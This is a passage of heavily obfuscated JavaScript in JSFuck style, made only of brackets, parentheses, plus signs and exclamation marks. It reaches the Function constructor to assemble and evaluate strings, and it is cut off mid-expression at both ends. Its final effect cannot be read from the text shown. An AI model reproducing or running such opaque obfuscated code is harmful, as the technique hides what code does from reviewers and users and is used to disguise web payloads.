!![]+[])[+[]]][([]+{})[!+[]+!![]+!![]+!![]+!![]]+([]+{})[+!![]]+([][[]]+[])[+!![]]+(![]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+[]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(!![]+[])[+[]]+([]+{})[+!![]]+(!![]+[])[+!![]]]((!![]+[])[+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]+!![]+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(![]+[])[!+[]+!![]+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(+{}+[])[+!![]]+([]+[][(![]+[])[!+[]+!![]+!![]]+([]+{})[+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]][([]+{})[!+[]+!![]+!![]+!![]+!![]]+([]+{})[+!![]]+([][[]]+[])[+!![]]+(![]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+[]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(!![]+[])[+[]]+([]+{})[+!![]]+(!![]+[])[+!![]]]((!![]+[])[+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]+!![]+!![]]+(![]+[])[!+[]+!![]]+([]+{})[+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(+{}+[])[+!![]]+(!![]+[])[+[]]+([][[]]+[])[!+[]+!![]+!![]+!![]+!![]]+([]+{})[+!![]]+([][[]]+[])[+!![]])())[!+[]+!![]+!![]]+([][[]]+[])[!+[]+!![]+!![]])()(([]+{})[+[]])[+[]]+(!+[]+!![]+!![]+!![]+!![]+!![]+!![]+[])+(!+[]+!![]+!![]+!![]+!![]+!![]+[]))+([][[]]+[])[!+[]+!![]+!![]]+([][[]]+[])[!+[]+!![]+!![]+!![]]+([][[]]+[])[+[]]+([][[]]+[])[+!![]]+[][(![]+[])[!+[]+!![]+!![]]+([]+{})[+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]][([]+{})[!+[]+!![]+!![]+!![]+!![]]+([]+{})[+!![]]+([][[]]+[])[+!![]]+(![]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+[]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(!![]+[])[+[]]+([]+{})[+!![]]+(!![]+[])[+!![]]]((!![]+[])[+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]+!![]+!![]]+([][[]]+[])[+[]]+([][[]]+[])[+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(![]+[])[!+[]+!![]+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(+{}+[])[+!![]]+([]+[][(![]+[])[!+[]+!![]+!![]]+([]+{})[+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]][([]+{})[!+[]+!![]+!![]+!![]+!![]]+([]+{})[+!![]]+([][[]]+[])[+!![]]+(![]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+[]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(!![]+[])[+[]]+([]+{})[+!![]]+(!![]+[])[+!![]]]((!![]+[])[+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]+!![]+!![]]+(![]+[])[!+[]+!![]]+([]+{})[+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(+{}+[])[+!![]]+(!![]+[])[+[]]+([][[]]+[])[!+[]+!![]+!![]+!![]+!![]]+([]+{})[+!![]]+([][[]]+[])[+!![]])())[!+[]+!![]+!![]]+([][[]]+[])[!+[]+!![]+!![]])()([][(![]+[])[!+[]+!![]+!![]]+([]+{})[+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]][([]+{})[!+[]+!![]+!![]+!![]+!![]]+([]+{})[+!![]]+([][[]]+[])[+!![]]+(![]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+[]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(!![]+[])[+[]]+([]+{})[+!![]]+(!![]+[])[+!![]]]((!![]+[])[+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]+!![]+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(![]+[])[!+[]+!![]+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(+{}+[])[+!![]]+([]+[][(![]+[])[!+[]+!![]+!![]]+([]+{})[+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]][([]+{})[!+[]+!![]+!![]+!![]+!![]]+([]+{})[+!![]]+([][[]]+[])[+!![]]+(![]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+[]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(!![]+[])[+[]]+([]+{})[+!![]]+(!![]+[])[+!![]]]((!![]+[])[+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]+!![]+!![]]+(![]+[])[!+[]+!![]]+([]+{})[+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(+{}+[])[+!![]]+(!![]+[])[+[]]+([][[]]+[])[!+[]+!![]+!![]+!![]+!![]]+([]+{})[+!![]]+([][[]]+[])[+!![]])())[!+[]+!![]+!![]]+([][[]]+[])[!+[]+!![]+!![]])()(([]+{})[+[]])[+[]]+(!+[]+!![]+[])+(!+[]+!![]+[]))+[][(![]+[])[!+[]+!![]+!![]]+([]+{})[+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]][([]+{})[!+[]+!![]+!![]+!![]+!![]]+([]+{})[+!![]]+([][[]]+[])[+!![]]+(![]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+[]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(!![]+[])[+[]]+([]+{})[+!![]]+(!![]+[])[+!![]]]((!![]+[])[+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]+!![]+!![]]+([][[]]+[])[+[]]+([][[]]+[])[+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(![]+[])[!+[]+!![]+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(+{}+[])[+!![]]+([]+[][(![]+[])[!+[]+!![]+!![]]+([]+{})[+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]][([]+{})[!+[]+!![]+!![]+!![]+!![]]+([]+{})[+!![]]+([][[]]+[])[+!![]]+(![]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+[]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(!![]+[])[+[]]+([]+{})[+!![]]+(!![]+[])[+!![]]]((!![]+[])[+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]+!![]+!![]]+(![]+[])[!+[]+!![]]+([]+{})[+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(+{}+[])[+!![]]+(!![]+[])[+[]]+([][[]]+[])[!+[]+!![]+!![]+!![]+!![]]+([]+{})[+!![]]+([][[]]+[])[+!![]])())[!+[]+!![]+!![]]+([][[]]+[])[!+[]+!![]+!![]])()([][(![]+[])[!+[]+!![]+!![]]+([]+{})[+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]][([]+{})[!+[]+!![]+!![]+!![]+!![]]+([]+{})[+!![]]+([][[]]+[])[+!![]]+(![]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+[]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(!![]+[])[+[]]+([]+{})[+!![]]+(!![]+[])[+!![]]]((!![]+[])[+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]+!![]+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(![]+[])[!+[]+!![]+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(+{}+[])[+!![]]+([]+[][(![]+[])[!+[]+!![]+!![]]+([]+{})[+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]][([]+{})[!+[]+!![]+!![]+!![]+!![]]+([]+{})[+!![]]+([][[]]+[])[+!![]]+(![]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+[]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(!![]+[])[+[]]+([]+{})[+!![]]+(!![]+[])[+!![]]]((!![]+[])[+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]+!![]+!![]]+(![]+[])[!+[]+!![]]+([]+{})[+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(+{}+[])[+!![]]+(!![]+[])[+[]]+([][[]]+[])[!+[]+!![]+!![]+!![]+!![]]+([]+{})[+!![]]+([][[]]+[])[+!![]])())[!+[]+!![]+!![]]+([][[]]+[])[!+[]+!![]+!![]])()(([]+{})[+[]])[+[]]+(!+[]+!![]+!![]+[])+([]+{})[!+[]+!![]])+[][(![]+[])[!+[]+!![]+!![]]+([]+{})[+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]][([]+{})[!+[]+!![]+!![]+!![]+!![]]+([]+{})[+!![]]+([][[]]+[])[+!![]]+(![]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+[]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(!![]+[])[+[]]+([]+{})[+!![]]+(!![]+[])[+!![]]]((!![]+[])[+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]+!![]+!![]]+([][[]]+[])[+[]]+([][[]]+[])[+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(![]+[])[!+[]+!![]+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(+{}+[])[+!![]]+([]+[][(![]+[])[!+[]+!![]+!![]]+([]+{})[+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]][([]+{})[!+[]+!![]+!![]+!![]+!![]]+([]+{})[+!![]]+([][[]]+[])[+!![]]+(![]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+[]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(!![]+[])[+[]]+([]+{})[+!![]]+(!![]+[])[+!![]]]((!![]+[])[+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]+!![]+!![]]+(![]+[])[!+[]+!![]]+([]+{})[+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(+{}+[])[+!![]]+(!![]+[])[+[]]+([][[]]+[])[!+[]+!![]+!![]+!![]+!![]]+([]+{})[+!![]]+([][[]]+[])[+!![]])())[!+[]+!![]+!![]]+([][[]]+[])[!+[]+!![]+!![]])()([][(![]+[])[!+[]+!![]+!![]]+([]+{})[+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]][([]+{})[!+[]+!![]+!![]+!![]+!![]]+([]+{})[+!![]]+([][[]]+[])[+!![]]+(![]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+[]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(!![]+[])[+[]]+([]+{})[+!![]]+(!![]+[])[+!![]]]((!![]+[])[+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]+!![]+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(![]+[])[!+[]+!![]+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(+{}+[])[+!![]]+([]+[][(![]+[])[!+[]+!![]+!![]]+([]+{})[+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]][([]+{})[!+[]+!![]+!![]+!![]+!![]]+([]+{})[+!![]]+([][[]]+[])[+!![]]+(![]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+[]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(!![]+[])[+[]]+([]+{})[+!![]]+(!![]+[])[+!![]]]((!![]+[])[+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]+!![]+!![]]+(![]+[])[!+[]+!![]]+([]+{})[+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(+{}+[])[+!![]]+(!![]+[])[+[]]+([][[]]+[])[!+[]+!![]+!![]+!![]+!![]]+([]+{})[+!![]]+([][[]]+[])[+!![]])())[!+[]+!![]+!![]]+([][[]]+[])[!+[]+!![]+!![]])()(([]+{})[+[]])[+[]]+(+[]+[])+(+{}+[])[+!![]])+([]+{})[!+[]+!![]+!![]+!![]+!![]]+([]+{})[+!![]]+([][[]]+[])[+!![]]+(![]+[])[!+[]+!![]+!![]]+([]+{})[+!![]]+(![]+[])[!+[]+!![]]+([][[]]+[])[!+[]+!![]+!![]]+[][(![]+[])[!+[]+!![]+!![]]+([]+{})[+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]][([]+{})[!+[]+!![]+!![]+!![]+!![]]+([]+{})[+!![]]+([][[]]+[])[+!![]]+(![]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+[]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(!![]+[])[+[]]+([]+{})[+!![]]+(!![]+[])[+!![]]]((!![]+[])[+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]+!![]+!![]]+([][[]]+[])[+[]]+([][[]]+[])[+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(![]+[])[!+[]+!![]+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(+{}+[])[+!![]]+([]+[][(![]+[])[!+[]+!![]+!![]]+([]+{})[+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]][([]+{})[!+[]+!![]+!![]+!![]+!![]]+([]+{})[+!![]]+([][[]]+[])[+!![]]+(![]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+[]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(!![]+[])[+[]]+([]+{})[+!![]]+(!![]+[])[+!![]]]((!![]+[])[+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]+!![]+!![]]+(![]+[])[!+[]+!![]]+([]+{})[+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(+{}+[])[+!![]]+(!![]+[])[+[]]+([][[]]+[])[!+[]+!![]+!![]+!![]+!![]]+([]+{})[+!![]]+([][[]]+[])[+!![]])())[!+[]+!![]+!![]]+([][[]]+[])[!+[]+!![]+!![]])()([][(![]+[])[!+[]+!![]+!![]]+([]+{})[+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]][([]+{})[!+[]+!![]+!![]+!![]+!![]]+([]+{})[+!![]]+([][[]]+[])[+!![]]+(![]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+[]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(!![]+[])[+[]]+([]+{})[+!![]]+(!![]+[])[+!![]]]((!![]+[])[+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]+!![]+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(![]+[])[!+[]+!![]+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(+{}+[])[+!![]]+([]+[][(![]+[])[!+[]+!![]+!![]]+([]+{})[+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]][([]+{})[!+[]+!![]+!![]+!![]+!![]]+([]+{})[+!![]]+([][[]]+[])[+!![]]+(![]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+[]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(!![]+[])[+[]]+([]+{})[+!![]]+(!![]+[])[+!![]]]((!![]+[])[+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]+!![]+!![]]+(![]+[])[!+[]+!![]]+([]+{})[+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(+{}+[])[+!![]]+(!![]+[])[+[]]+([][[]]+[])[!+[]+!![]+!![]+!![]+!![]]+([]+{})[+!![]]+([][[]]+[])[+!![]])())[!+[]+!![]+!![]]+([][[]]+[])[!+[]+!![]+!![]])()(([]+{})[+[]])[+[]]+(!+[]+!![]+[])+([][[]]+[])[!+[]+!![]+!![]])+(![]+[])[!+[]+!![]]+([]+{})[+!![]]+[][(![]+[])[!+[]+!![]+!![]]+([]+{})[+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]][([]+{})[!+[]+!![]+!![]+!![]+!![]]+([]+{})[+!![]]+([][[]]+[])[+!![]]+(![]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+[]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(!![]+[])[+[]]+([]+{})[+!![]]+(!![]+[])[+!![]]]((!![]+[])[+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]+!![]+!![]]+([][[]]+[])[+[]]+([][[]]+[])[+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(![]+[])[!+[]+!![]+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(+{}+[])[+!![]]+([]+[][(![]+[])[!+[]+!![]+!![]]+([]+{})[+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]][([]+{})[!+[]+!![]+!![]+!![]+!![]]+([]+{})[+!![]]+([][[]]+[])[+!![]]+(![]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+[]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(!![]+[])[+[]]+([]+{})[+!![]]+(!![]+[])[+!![]]]((!![]+[])[+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]+!![]+!![]]+(![]+[])[!+[]+!![]]+([]+{})[+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(+{}+[])[+!![]]+(!![]+[])[+[]]+([][[]]+[])[!+[]+!![]+!![]+!![]+!![]]+([]+{})[+!![]]+([][[]]+[])[+!![]])())[!+[]+!![]+!![]]+([][[]]+[])[!+[]+!![]+!![]])()([][(![]+[])[!+[]+!![]+!![]]+([]+{})[+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]][([]+{})[!+[]+!![]+!![]+!![]+!![]]+([]+{})[+!![]]+([][[]]+[])[+!![]]+(![]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+[]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(!![]+[])[+[]]+([]+{})[+!![]]+(!![]+[])[+!![]]]((!![]+[])[+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]+!![]+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(![]+[])[!+[]+!![]+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(+{}+[])[+!![]]+([]+[][(![]+[])[!+[]+!![]+!![]]+([]+{})[+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]][([]+{})[!+[]+!![]+!![]+!![]+!![]]+([]+{})[+!![]]+([][[]]+[])[+!![]]+(![]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+[]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(!![]+[])[+[]]+([]+{})[+!![]]+(!![]+[])[+!![]]]((!![]+[])[+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]+!![]+!![]]+(![]+[])[!+[]+!![]]+([]+{})[+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(+{}+[])[+!![]]+(!![]+[])[+[]]+([][[]]+[])[!+[]+!![]+!![]+!![]+!![]]+([]+{})[+!![]]+([][[]]+[])[+!![]])())[!+[]+!![]+!![]]+([][[]]+[])[!+[]+!![]+!![]])()(([]+{})[+[]])[+[]]+(!+[]+!![]+!![]+!![]+!![]+!![]+[])+(!+[]+!![]+!![]+!![]+!![]+!![]+!![]+[]))+[][(![]+[])[!+[]+!![]+!![]]+([]+{})[+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]][([]+{})[!+[]+!![]+!![]+!![]+!![]]+([]+{})[+!![]]+([][[]]+[])[+!![]]+(![]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+[]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(!![]+[])[+[]]+([]+{})[+!![]]+(!![]+[])[+!![]]]((!![]+[])[+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]+!![]+!![]]+([][[]]+[])[+[]]+([][[]]+[])[+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(![]+[])[!+[]+!![]+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(+{}+[])[+!![]]+([]+[][(![]+[])[!+[]+!![]+!![]]+([]+{})[+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]][([]+{})[!+[]+!![]+!![]+!![]+!![]]+([]+{})[+!![]]+([][[]]+[])[+!![]]+(![]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+[]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(!![]+[])[+[]]+([]+{})[+!![]]+(!![]+[])[+!![]]]((!![]+[])[+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]+!![]+!![]]+(![]+[])[!+[]+!![]]+([]+{})[+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(+{}+[])[+!![]]+(!![]+[])[+[]]+([][[]]+[])[!+[]+!![]+!![]+!![]+!![]]+([]+{})[+!![]]+([][[]]+[])[+!![]])())[!+[]+!![]+!![]]+([][[]]+[])[!+[]+!![]+!![]])()([][(![]+[])[!+[]+!![]+!![]]+([]+{})[+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]][([]+{})[!+[]+!![]+!![]+!![]+!![]]+([]+{})[+!![]]+([][[]]+[])[+!![]]+(![]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+[]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(!![]+[])[+[]]+([]+{})[+!![]]+(!![]+[])[+!![]]]((!![]+[])[+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]+!![]+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(![]+[])[!+[]+!![]+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(+{}+[])[+!![]]+([]+[][(![]+[])[!+[]+!![]+!![]]+([]+{})[+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]][([]+{})[!+[]+!![]+!![]+!![]+!![]]+([]+{})[+!![]]+([][[]]+[])[+!![]]+(![]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+[]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(!![]+[])[+[]]+([]+{})[+!![]]+(!![]+[])[+!![]]]((!![]+[])[+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]+!![]+!![]]+(![]+[])[!+[]+!![]]+([]+{})[+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(+{}+[])[+!![]]+(!![]+[])[+[]]+([][[]]+[])[!+[]+!![]+!![]+!![]+!![]]+([]+{})[+!![]]+([][[]]+[])[+!![]])())[!+[]+!![]+!![]]+([][[]]+[])[!+[]+!![]+!![]])()(([]+{})[+[]])[+[]]+(!+[]+!![]+[])+(!+[]+!![]+!![]+!![]+!![]+!![]+!![]+!![]+[]))+[][(![]+[])[!+[]+!![]+!![]]+([]+{})[+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]][([]+{})[!+[]+!![]+!![]+!![]+!![]]+([]+{})[+!![]]+([][[]]+[])[+!![]]+(![]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+[]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(!![]+[])[+[]]+([]+{})[+!![]]+(!![]+[])[+!![]]]((!![]+[])[+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]+!![]+!![]]+([][[]]+[])[+[]]+([][[]]+[])[+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(![]+[])[!+[]+!![]+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(+{}+[])[+!![]]+([]+[][(![]+[])[!+[]+!![]+!![]]+([]+{})[+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]][([]+{})[!+[]+!![]+!![]+!![]+!![]]+([]+{})[+!![]]+([][[]]+[])[+!![]]+(![]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+[]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(!![]+[])[+[]]+([]+{})[+!![]]+(!![]+[])[+!![]]]((!![]+[])[+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]+!![]+!![]]+(![]+[])[!+[]+!![]]+([]+{})[+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(+{}+[])[+!![]]+(!![]+[])[+[]]+([][[]]+[])[!+[]+!![]+!![]+!![]+!